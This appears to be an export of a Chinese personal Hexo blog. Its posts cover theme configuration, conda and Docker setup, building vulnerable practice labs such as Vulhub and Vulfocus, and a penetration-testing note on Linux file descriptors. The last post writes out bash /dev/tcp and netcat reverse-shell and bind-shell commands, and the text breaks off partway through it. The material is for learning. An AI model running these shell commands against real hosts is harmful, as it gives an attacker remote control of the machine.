<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Snackbar 彈窗</span></span><br><span class="line"><span class="comment"># https://github.com/polonel/SnackBar</span></span><br><span class="line"><span class="comment"># position 彈窗位置</span></span><br><span class="line"><span class="comment"># 可選 top-left / top-center / top-right / bottom-left / bottom-center / bottom-right</span></span><br><span class="line"><span class="attr">snackbar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">bottom-left</span></span><br><span class="line">  <span class="attr">bg_light:</span> <span class="string">&#x27;#49b1f5&#x27;</span> <span class="comment">#light mode時彈窗背景</span></span><br><span class="line">  <span class="attr">bg_dark:</span> <span class="string">&#x27;#2d3035&#x27;</span> <span class="comment">#dark mode時彈窗背景</span></span><br></pre></td></tr></table></figure>
<h1 id="Snackbar弹窗"><a href="#Snackbar弹窗" class="headerlink" title="Snackbar弹窗"></a>Snackbar弹窗</h1><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">snackbar:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">top-center</span></span><br><span class="line">  <span class="attr">bg_light:</span> <span class="string">&#x27;#49b1f5&#x27;</span> <span class="comment"># The background color of Toast Notification in light mode</span></span><br><span class="line">  <span class="attr">bg_dark:</span> <span class="string">&#x27;#1f1f1f&#x27;</span> <span class="comment"># The background color of Toast Notification in dark mode</span></span><br></pre></td></tr></table></figure>
<h1 id="Instantpage"><a href="#Instantpage" class="headerlink" title="Instantpage"></a>Instantpage</h1><p>鼠标悬停会预加载；好神奇来一个</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># https://instant.page/</span></span><br><span class="line"><span class="comment"># prefetch (預加載)</span></span><br><span class="line"><span class="attr">instantpage:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<h1 id="Pabgu"><a href="#Pabgu" class="headerlink" title="Pabgu"></a>Pabgu</h1><p>no need</p>
<h1 id="PWA"><a href="#PWA" class="headerlink" title="PWA"></a>PWA</h1><p>配过了吧</p>
]]></content>
      <tags>
        <tag>日记</tag>
        <tag>butterfly</tag>
        <tag>主题</tag>
      </tags>
  </entry>
  <entry>
    <title>快速配置你的python环境之conda</title>
    <url>/posts/dc24cb67.html</url>
    <content><![CDATA[<p>安装过程：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-latest-Windows-x86_64.exe</span></span><br><span class="line"><span class="comment">#下载链接~</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>选择all users —</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507211527543.png" alt="image-20240507211527543" style="zoom:67%;" /> </p>
<p>这里全部勾选。</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507211746825.png" alt="image-20240507211746825" style="zoom:67%;" /> </p>
<p> 然后添加环境变量：win+r -&gt;sysdm.cpl 选择高级环境变量；编辑path变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\minaconda3\condabin #嗯，要按照安装路径自己改的说</span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507212458949.png" alt="image-20240507212458949" style="zoom: 50%;" /> </p>
<p>给canda换源：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">notepad</span> <span class="string">%USERPROFILE%\.condarc</span></span><br></pre></td></tr></table></figure>
<p>输入下面的内容</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">channels:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">defaults</span></span><br><span class="line"><span class="attr">show_channel_urls:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">channel_alias:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda</span></span><br><span class="line"><span class="attr">default_channels:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/pro</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2</span></span><br><span class="line"><span class="attr">custom_channels:</span></span><br><span class="line">  <span class="attr">conda-forge:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br><span class="line">  <span class="attr">msys2:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br><span class="line">  <span class="attr">bioconda:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br><span class="line">  <span class="attr">menpo:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br><span class="line">  <span class="attr">pytorch:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br><span class="line">  <span class="attr">simpleitk:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br></pre></td></tr></table></figure>
<p>像修改env保存地方的话：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">conda</span> <span class="string">config</span> <span class="string">--add</span> <span class="string">envs_dirs</span> <span class="string">D:\miniconda3\envs</span></span><br></pre></td></tr></table></figure>
<p>最后修改文件权限：？</p>
<p>使用不同版本的python时：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">conda</span> <span class="string">activate</span> <span class="string">base</span> <span class="comment">#进入conda bash命令行</span></span><br><span class="line"><span class="comment">#不过在外面创建说是</span></span><br><span class="line"><span class="string">conda</span> <span class="string">create</span> <span class="string">-n</span> <span class="string">py39</span> <span class="string">python=3.9</span></span><br><span class="line"><span class="string">py27</span></span><br><span class="line"><span class="string">py39</span></span><br><span class="line"><span class="string">bash</span></span><br><span class="line"><span class="string">canda</span> <span class="string">env</span> <span class="string">list</span></span><br><span class="line"><span class="string">conda</span> <span class="string">activate</span> <span class="string">env_name</span></span><br><span class="line"><span class="string">python</span></span><br><span class="line"><span class="string">pip</span> <span class="string">install</span> <span class="string">-r</span> <span class="string">requirement.txt</span></span><br><span class="line"><span class="string">canda</span> <span class="string">deactivate</span> <span class="comment">#退出</span></span><br><span class="line"><span class="comment"># 进入py39虚拟环境</span></span><br><span class="line"><span class="string">conda</span> <span class="string">activate</span> <span class="string">py39</span></span><br><span class="line"><span class="string">conda</span> <span class="string">deactivate</span></span><br><span class="line"><span class="comment"># 进入base虚拟环境</span></span><br><span class="line"><span class="string">conda</span> <span class="string">activate</span> <span class="string">base</span></span><br><span class="line"><span class="string">conda</span> <span class="string">deactivate</span></span><br><span class="line"><span class="comment">#下载命令</span></span><br><span class="line"><span class="string">pip</span> <span class="string">install</span> <span class="string">-r</span> <span class="string">requirements.txt</span> <span class="string">-i</span> <span class="string">https://pypi.tuna.tsinghua.edu.cn/simple/</span></span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>环境配置</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透日记之docker介绍</title>
    <url>/posts/480dc9b5.html</url>
    <content><![CDATA[<h2 id="Docker-介绍"><a href="#Docker-介绍" class="headerlink" title="Docker~介绍"></a>Docker~介绍</h2><p>docker组成部分</p>
<ul>
<li>Docker Client 客户端</li>
<li>Docker Daemon 守护进程</li>
<li>Docker Image 镜像——关键之一</li>
<li>Docker Container 容器——关键之一</li>
</ul>
<blockquote>
<p>[!NOTE]</p>
<p>VMware是完全虚拟，硬件虚拟化，虚拟操作系统，驱动，应用程序-——安全，物理隔离。</p>
<p>共用主机的部分应用程序，服务。</p>
<p>云安全。有docker逃逸？</p>
</blockquote>
<p>安装方式：（推荐Linux系统）</p>
<ol>
<li><p>docker.io: apt install docker.io Debian团队维护和打包</p>
</li>
<li><p>docker.ce: Docker 官方团队维护和打包</p>
</li>
<li><p>docker.ee: 商业版</p>
<p>Docker环境安装：使用yijing快速安装：</p>
</li>
</ol>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> etc/apt/soureces.list <span class="comment">#检查下载源</span></span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/yijingsec/LinuxEnvConfig.git</span><br><span class="line"><span class="built_in">cd</span> LinuxEnvConfig</span><br><span class="line">sudo bash LinuxEnvConfig.sh</span><br><span class="line"><span class="comment">#选择 11.  脚本自动进行Docker安装</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io #手动版？ 可以无视这个捏 </span><br><span class="line">apt remove docker docker-engine docker.io #卸载旧版本</span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507210921854.png" alt="image-20240507210921854" style="zoom: 80%;" /></p>
<p>相关命令操作：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看docker服务状态</span></span><br><span class="line">systemctl status docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动docker服务</span></span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启自启动docker服务</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>
<p>有必要的话还要安装docker-compose：最新版会自带的；</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose</span><br></pre></td></tr></table></figure>
<h2 id="Docker基础操作部分："><a href="#Docker基础操作部分：" class="headerlink" title="Docker基础操作部分："></a>Docker基础操作部分：</h2><h3 id="1-对镜像的操作："><a href="#1-对镜像的操作：" class="headerlink" title="1.对镜像的操作："></a>1.对镜像的操作：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker image ls -a</span><br><span class="line">docker images</span><br><span class="line">REPOSITORY：镜像所在的仓库名称</span><br><span class="line">TAG：镜像标签</span><br><span class="line">IMAGEID：镜像ID</span><br><span class="line">CREATED：镜像的创建日期(不是获取该镜像的日期)</span><br><span class="line">SIZE：镜像大小</span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507223445979.png" alt="image-20240507223445979"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker image pull：抓取 image 文件的命令</span><br><span class="line">library/hello-world：image 文件在仓库里面的位置</span><br><span class="line">library：是 image 文件所在的组</span><br><span class="line">hello-world：是 image 文件的名字</span><br><span class="line">#当然因为image都是在library里面的 所以你可以</span><br><span class="line">docker image pull hello-world</span><br><span class="line">#顺便一提，这个命令其实也不是很重要，后面的docker run 或者 docker-compose up -d</span><br><span class="line">#都是会自动拉取镜像下载的w</span><br></pre></td></tr></table></figure>
<p>顺便一提，速度好慢；拉取镜像建议还是直接拉国内的项目or proxychains</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507223808633.png" alt="image-20240507223808633"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#先列出镜像</span><br><span class="line">docker images</span><br><span class="line">docker image rm 镜像名或镜像id</span><br><span class="line">docker rmi 镜像名或镜像id</span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">docker image rm hello-world</span><br><span class="line">docker rmi feb5d9fea6a5</span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507223941168.png" alt="image-20240507223941168"></p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507224057383.png" alt="image-20240507224057383"></p>
<p>看一下就知道没拉~</p>
<h3 id="2-对Docker-容器进行操作"><a href="#2-对Docker-容器进行操作" class="headerlink" title="2.对Docker 容器进行操作"></a>2.对Docker 容器进行操作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run hello-world <span class="comment">#启动容器</span></span><br><span class="line"><span class="comment">#这里有几个参数要注意：</span></span><br><span class="line">-i 表示以“交互模式”运行容器</span><br><span class="line">-t 表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即 分配一个伪终端。</span><br><span class="line">--name 为创建的容器命名</span><br><span class="line">-v 表示目录映射关系(前者是宿主机目录，后者是映射到宿主机上的目录，即 宿主机目录:容器中目录)，可以使 用多个-v 做多个目录或文件映射。注意:最好做目录映射，在宿主机上做修改，然后 共享到容器上。</span><br><span class="line">-d 在run后面加上-d参数,则会创建一个守护式容器在后台运行(这样创建容器后不 会自动登录容器，如果加-i -t 两个参数，创建后就会自动进去容器)。</span><br><span class="line">-p 表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p 做多个端口映射</span><br><span class="line">-e 为容器设置环境变量</span><br><span class="line">--network=host 表示将主机的网络环境映射到容器中，容器的网络与主机相同</span><br><span class="line"><span class="comment">#常用的命令的话就是</span></span><br><span class="line">docker run -d --name=Myhello  hello-world <span class="comment">#后台运行</span></span><br><span class="line">docker run -it --name=Myhello hello-world /bin/bash <span class="comment">#进入命令行 执行bash命令</span></span><br></pre></td></tr></table></figure>
<p>创建成功的样子娅：</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507225026390.png" alt="image-20240507225026390"></p>
<p>再来个交互式运行的：（事实证明就算没有library，没有image都是可以直接run的</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507231332725.png" alt="image-20240507231332725"></p>
<p>这里面的文件目录都是虚假的，点进去也没有内容的x  想退出的话就exit </p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507231508161.png" alt="image-20240507231508161"></p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507231704804.png" alt="image-20240507231704804"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建完之后当然是....删除掉啦！</span><br><span class="line">docker stop 34d #暂停运行</span><br><span class="line">docker kill 34d #杀掉一个在运行的进程</span><br><span class="line">docker rm -f  34d #强制删除</span><br><span class="line">docker rm $(docker ps -aq) -f  #全部删除</span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507232112795.png" alt="image-20240507232112795"></p>
<h3 id="3-容器保存为镜像-（怎么说也不一定用得到"><a href="#3-容器保存为镜像-（怎么说也不一定用得到" class="headerlink" title="3.容器保存为镜像 （怎么说也不一定用得到"></a>3.容器保存为镜像 （怎么说也不一定用得到</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker commit 容器名 镜像名</span></span><br><span class="line"></span><br><span class="line">docker commit mycentos3 mycentos3</span><br></pre></td></tr></table></figure>
<h3 id="4-镜像备份与迁移"><a href="#4-镜像备份与迁移" class="headerlink" title="4.镜像备份与迁移"></a>4.镜像备份与迁移</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker save -o 保存的文件名 镜像名</span></span><br><span class="line">docker save -o ./mycentos3.tar mycentos3</span><br><span class="line">docker load -i ./mycentos3.tar</span><br></pre></td></tr></table></figure>
<h2 id="docker搭建漏洞靶场"><a href="#docker搭建漏洞靶场" class="headerlink" title="docker搭建漏洞靶场"></a>docker搭建漏洞靶场</h2><h3 id="克隆Vulhub项目"><a href="#克隆Vulhub项目" class="headerlink" title="克隆Vulhub项目"></a>克隆Vulhub项目</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/yijingsec/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub-master</span><br><span class="line"><span class="built_in">cd</span> thinkphp/5.0.23-rce</span><br><span class="line"><span class="comment"># 开启靶场</span></span><br><span class="line">docker-compose up -d </span><br><span class="line"><span class="comment"># 关闭靶场</span></span><br><span class="line">docker-compose down </span><br></pre></td></tr></table></figure>
<h3 id="VulnaApps"><a href="#VulnaApps" class="headerlink" title="VulnaApps"></a>VulnaApps</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">https://gitee.com/yijingsec/VulApps</span></span><br></pre></td></tr></table></figure>
<p>打开浏览器访问：<a href="https://gitee.com/yijingsec/VulApps">https://gitee.com/yijingsec/VulApps</a></p>
<p>打开read.me  按照文档操作就好了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 以启动thinkphp漏洞环境为例</span><br><span class="line"></span><br><span class="line">docker pull medicean/vulapps:t_thinkphp_2</span><br><span class="line"></span><br><span class="line">docker run -d -p 80:80 medicean/vulapps:t_thinkphp_2</span><br><span class="line"></span><br><span class="line"># -p 80:80 前面的 80 代表物理机的端口，可随意指定；后面的 80 为docker容器中的web服务端口，默认端口80。</span><br></pre></td></tr></table></figure>
<h3 id="Vulfocus"><a href="#Vulfocus" class="headerlink" title="Vulfocus"></a>Vulfocus</h3><p>安装：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/yijingsec/LinuxEnvConfig.git</span><br><span class="line"></span><br><span class="line">cd LinuxEnvConfig</span><br><span class="line"></span><br><span class="line">sudo bash LinuxEnvConfig.sh</span><br><span class="line">docker run -d -p 88:80 --name vulfocus --restart always -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=192.168.190.214 registry.cn-hangzhou.aliyuncs.com/mingy123/vulfocus:latest</span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507233706186.png" alt="image-20240507233706186"></p>
<p>你的密码~</p>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507233725729.png" alt="image-20240507233725729"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>渗透</tag>
        <tag>日记</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/posts/4a17b156.html</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>test1</title>
    <url>/posts/8ab2dce2.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>test2</title>
    <url>/posts/13bb8d58.html</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>shell反弹其一</title>
    <url>/posts/a0000003.html</url>
    <content><![CDATA[<h2 id="linux文件描述符"><a href="#linux文件描述符" class="headerlink" title="linux文件描述符"></a>linux文件描述符</h2><p>文件描述符是一个非负整数（0~n），内核需要通过这个文件描述符才可以访问文件。文件描述符好比一本书的目录（索引），通过这个索引可以找到需要的内容。在Linux内核默认为每个进程创建三个标准的文件描述符0（标准输入）、1（标准输出）、2（标准错误）</p>
<p>通过查看/proc/PID/fd目录下的文件，就可以查看每个进程拥有的文件描述符。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看当前shell的文件描述符</span></span><br><span class="line"><span class="string">ll</span> <span class="string">/proc/$$/fd</span></span><br></pre></td></tr></table></figure>
<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240607201053088.png" alt="image-20240607201053088"></p>
<blockquote>
<p>[!NOTE]</p>
<p>255文件描述符是一个小技巧，bash用于在重定向时保留这些副本。</p>
</blockquote>
<p>打开文件时，系统内核会为特定的进程自动创建对应的文件描述符</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># tail打开一个文件</span></span><br><span class="line"><span class="string">tail</span> <span class="string">-f</span> <span class="string">flag</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取tail进程PID</span></span><br><span class="line"><span class="string">pidof</span> <span class="string">tail</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看tail进程创建的文件描述符</span></span><br><span class="line"><span class="string">ll</span> <span class="string">/proc/98/fd</span></span><br></pre></td></tr></table></figure>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>1.输入重定向</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&lt;</span></span><br><span class="line"><span class="string">从文件读取输入。</span></span><br></pre></td></tr></table></figure>
<p>2.输出重定向</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&gt;</span></span><br><span class="line"><span class="string">将输出保存到文件。</span></span><br><span class="line"></span><br><span class="line"><span class="string">&gt;&gt;</span></span><br><span class="line"><span class="string">将输出追加到文件。</span></span><br></pre></td></tr></table></figure>
<p>3.管道</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">|</span></span><br><span class="line"><span class="string">将一个程序的输出作为输入发送到另一个程序。</span></span><br></pre></td></tr></table></figure>
<h2 id="文件描述符操作"><a href="#文件描述符操作" class="headerlink" title="文件描述符操作"></a>文件描述符操作</h2><h3 id="更改标准输出的位置"><a href="#更改标准输出的位置" class="headerlink" title="更改标准输出的位置"></a>更改标准输出的位置</h3><p>把标准输出更改到test文件中：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">exec</span> <span class="number">1</span><span class="string">&gt;</span> <span class="string">test</span></span><br></pre></td></tr></table></figure>
<h3 id="更改标准输入的位置"><a href="#更改标准输入的位置" class="headerlink" title="更改标准输入的位置"></a>更改标准输入的位置</h3><p>从键盘输入，读取user变量：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">➜</span> <span class="string">~</span> <span class="string">➜</span>  <span class="string">read</span> <span class="string">user</span></span><br><span class="line"><span class="string">testtest</span></span><br><span class="line"><span class="string">➜</span> <span class="string">~</span> <span class="string">➜</span>  <span class="string">echo</span> <span class="string">$user</span></span><br><span class="line"><span class="string">testtest</span></span><br></pre></td></tr></table></figure>
<p>将test文件中的内容重定向到标准输入：</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">➜</span> <span class="string">~</span> <span class="string">➜</span>  <span class="string">read</span> <span class="string">user</span> <span class="number">0</span><span class="string">&lt;</span> <span class="string">test</span></span><br><span class="line"><span class="string">➜</span> <span class="string">~</span> <span class="string">➜</span>  <span class="string">echo</span> <span class="string">$user</span></span><br><span class="line"><span class="string">lst</span></span><br></pre></td></tr></table></figure>
<h3 id="创建文件描述符"><a href="#创建文件描述符" class="headerlink" title="创建文件描述符"></a>创建文件描述符</h3><p>创建</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">exec</span> <span class="string">文件描述符</span> <span class="string">&lt;&gt;</span> <span class="string">文件名</span></span><br></pre></td></tr></table></figure>
<p>调用</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">&amp;文件描述符</span></span><br></pre></td></tr></table></figure>
<p>关闭</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">exec</span> <span class="string">文件描述符&lt;&amp;-</span></span><br><span class="line"><span class="string">或</span></span><br><span class="line"><span class="string">exec</span> <span class="string">文件描述符&gt;&amp;-</span></span><br></pre></td></tr></table></figure>
<p>如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜ ~ ➜  exec 5&gt; test</span><br><span class="line">➜ ~ ➜  echo &#x27;are you ok?&#x27; 1&gt;&amp;5</span><br><span class="line">➜ ~ ➜  cat test</span><br><span class="line">are you ok?</span><br></pre></td></tr></table></figure>
<h3 id="dev-null"><a href="#dev-null" class="headerlink" title="/dev/null"></a>/dev/null</h3><p>特殊文件，写入的任何东西都会被清空，从而丢掉不想保存的错误信息</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment">#将标准错误输出重定向到/dev/null</span></span><br><span class="line"><span class="string">whoami</span> <span class="number">2</span><span class="string">&gt;/dev/null</span></span><br><span class="line"><span class="comment">#快速移除文件中的数据而不用删除文件</span></span><br><span class="line"><span class="string">cat</span> <span class="string">/dev/null</span> <span class="string">&gt;</span> <span class="string">test</span></span><br></pre></td></tr></table></figure>
<h2 id="bash反弹shell原理"><a href="#bash反弹shell原理" class="headerlink" title="bash反弹shell原理"></a>bash反弹shell原理</h2><p>1）什么是反弹shell</p>
<p>被控端主动发起连接去连接控制端，通常被控端由于防火墙限制、权限不足、端口被占用导致不能正常接受发送过来的数据包。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">控制端：</span><br><span class="line">nc –lvvp 6666</span><br><span class="line">被控端：</span><br><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.81.154/6666 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>参数解释</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -i</span><br><span class="line">打开一个交互式的bash shell。</span><br><span class="line"></span><br><span class="line">/dev/tcp/IP/PORT</span><br><span class="line">/dev/tcp/是Linux中的一个特殊设备文件（Linux一切皆文件），实际这个文件是不存在的，它只是 bash 实现的用来实现网络请求的一个接口。</span><br><span class="line">打开这个文件就相当于发起了一个socket调用，建立一个socket连接，读写这个文件就相当于在这个socket连接中传输数据。</span><br><span class="line"></span><br><span class="line">/dev/tcp/192.168.81.154/6666</span><br><span class="line">和192.168.81.154的6666端口建立TCP连接</span><br></pre></td></tr></table></figure>
<blockquote>
<p>[!IMPORTANT]</p>
<p>.&gt;&amp;、&amp;&gt;：混合输出（正确、错误的输出都输出到一个地方）</p>
<p>0&gt;&amp;1：将标准输入的读取对象设置为标准输出的输出对象</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 获取bash进程ID（128123）</span><br><span class="line">ps -elf|grep &quot;bash -i&quot;</span><br><span class="line"></span><br><span class="line"># 查看进程文件描述符</span><br><span class="line">ll /proc/128123/fd</span><br></pre></td></tr></table></figure>
</blockquote>
<h2 id="linux反弹shell方法"><a href="#linux反弹shell方法" class="headerlink" title="linux反弹shell方法"></a>linux反弹shell方法</h2><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>全名Netcat（网络刀）；常用于溢出，反向链接，上传文本等，是一个非标准的telnet客户端。也是一个putty.exe客户端。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">被控端：</span></span><br><span class="line"><span class="string">nc</span> <span class="string">-lvvp</span> <span class="number">6666</span> <span class="string">-e</span> <span class="string">/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="string">控制端：</span></span><br><span class="line"><span class="string">nc</span> <span class="number">10.10</span><span class="number">.1</span><span class="number">.7</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="string">原</span>  <span class="string">理：</span></span><br><span class="line"><span class="string">被控端使用nc将/bin/sh绑定到本地的6666端口，控制端主动连接被控端的6666端口，即可获得shell；这是正向连接</span></span><br><span class="line"></span><br><span class="line"><span class="string">控制端：</span></span><br><span class="line"><span class="string">nc</span> <span class="string">-lvvp</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="string">被控端：</span></span><br><span class="line"><span class="string">nc</span> <span class="string">-e</span> <span class="string">/bin/sh</span> <span class="number">10.10</span><span class="number">.1</span><span class="number">.11</span> <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="string">原理：</span></span><br><span class="line"><span 